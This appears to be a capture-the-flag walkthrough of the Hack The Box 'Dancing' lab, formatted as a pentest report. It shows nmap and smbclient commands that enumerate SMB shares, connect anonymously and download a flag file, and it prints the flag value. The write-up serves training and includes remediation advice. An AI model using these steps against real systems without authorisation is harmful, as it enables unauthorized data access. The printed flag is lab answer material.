# HTB Starting Point Lab Walkthrough: Dancing (Windows Box)

## Executive Summary

- **Lab Objective**: Enumerate and exploit accessible SMB shares on the target machine to retrieve a flag, simulating basic network share reconnaissance.
- **Target IP**: 10.129.206.156
- **Key Findings**: Identified multiple SMB shares, including one accessible anonymously (`WorkShares`). This allowed directory traversal and retrieval of sensitive files without authentication.
- **Impact**: In a real-world scenario, this could lead to unauthorized data access, potentially exposing confidential information.
- **Recommendations**: Enforce authentication on all shares, restrict anonymous access, and regularly audit share permissions.
- **Completion Date**: July 3, 2025
- **Tools Used**: Nmap, smbclient (on Kali Linux)

## Methodology and Scope

This walkthrough follows a standard reconnaissance and exploitation process for the HTB Starting Point lab "Dancing." The scope was limited to port scanning, SMB share enumeration, and file access on the provided target IP. No advanced exploitation or privilege escalation was required.

Steps were performed in a controlled lab environment using default Kali tools. Assumptions: Target is a Windows machine running SMB services.

## Findings

### Finding 1: SMB Service Identification

- **Description**: SMB (Server Message Block) is a network file sharing protocol. It operates on port 445, commonly associated with the service name "microsoft-ds."
- **Severity**: Informational (baseline enumeration).
- **Steps to Reproduce**:
    1. Perform a targeted port scan using Nmap:
        
        ```bash
        nmap -sS -p 445 10.129.206.156
        ```
        
        Output:
        
        ```bash
        Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 19:49 EDT
        Nmap scan report for 10.129.206.156
        Host is up (1.9s latency).
        PORT    STATE SERVICE
        445/tcp open  microsoft-ds
        Nmap done: 1 IP address (1 host up) scanned in 2.33 seconds
        ```
        
- **Impact**: Confirms SMB is active, enabling further enumeration.
- **Evidence**: Nmap scan results above.
- **Remediation**: N/A (informational).

### Finding 2: SMB Share Enumeration

- **Description**: Using smbclient, listed available shares on the target. Four shares were identified: ADMIN$, C$, IPC$, and WorkShares. The WorkShares share allows anonymous access (no password required).
- **Severity**: Medium (unauthenticated access to shares).
- **Steps to Reproduce**:
    1. List shares with smbclient using the `-L` flag:
        
        ```bash
        smbclient -L 10.129.206.156
        ```
        
        Output:
        
        ```bash
        Password for [WORKGROUP\reaper]:
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
        Reconnecting with SMB1 for workgroup listing.
        do_connect: Connection to 10.129.206.156 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
        Unable to connect with SMB1 -- no workgroup available
        ```
        
- **Impact**: Anonymous share access could allow unauthorized users to browse and retrieve files, risking data exposure.
- **Evidence**: smbclient output above.
- **Remediation**: Disable anonymous access to shares; require authentication for all connections.

### Finding 3: File Retrieval from Anonymous Share

- **Description**: Connected to the WorkShares share without credentials and navigated directories to locate and download a flag file.
- **Severity**: High (successful data exfiltration).
- **Steps to Reproduce**:
    1. Connect to the share anonymously using `-N` (no password):
        
        ```bash
        smbclient //10.129.206.156/WorkShares -N
        ```
        
    2. List directories:
        
        ```bash
        smb: \> dir
          .                                   D        0  Mon Mar 29 04:22:01 2021
          ..                                  D        0  Mon Mar 29 04:22:01 2021
          Amy.J                               D        0  Mon Mar 29 05:08:24 2021
          James.P                             D        0  Thu Jun  3 04:38:03 2021
        
                     5114111 blocks of size 4096. 1750496 blocks available
        ```
        
    3. Navigate to subdirectories and download the target file:
        
        ```bash
        smb: \> cd James.P
        smb: \James.P\> dir
          .                                   D        0  Thu Jun  3 04:38:03 2021
          ..                                  D        0  Thu Jun  3 04:38:03 2021
          flag.txt                            A       32  Mon Mar 29 05:26:57 2021
        
                     5114111 blocks of size 4096. 1750496 blocks available
        smb: \James.P\> get flag.txt
        getting file \James.P\flag.txt of size 32 as flag.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
        ```
        
    4. Verify locally:
        
        ```bash
        ls
        flag.txt
        cat flag.txt
        5f61c10dffbc77a704d76016a22f1664
        ```
        
- **Impact**: Demonstrates full read access to sensitive files, equivalent to a data breach in production.
- **Evidence**: Command outputs and flag value above.
- **Remediation**: Remove unnecessary shares; apply least-privilege permissions; monitor for unauthorized access.

## Recommendations

- Implement strong authentication (e.g., NTLMv2 or Kerberos) for SMB.
- Use firewalls to restrict SMB to trusted networks.
- Regularly scan for open shares and misconfigurations using tools like smbmap or enum4linux.
- For labs like this, practice escalating to tools like Impacket for more advanced SMB interactions.

## Appendices

- **Raw Notes/Logs**: (Optional—attach full session logs if sharing.)
- **Screenshots**: (Add here if available, e.g., terminal captures.)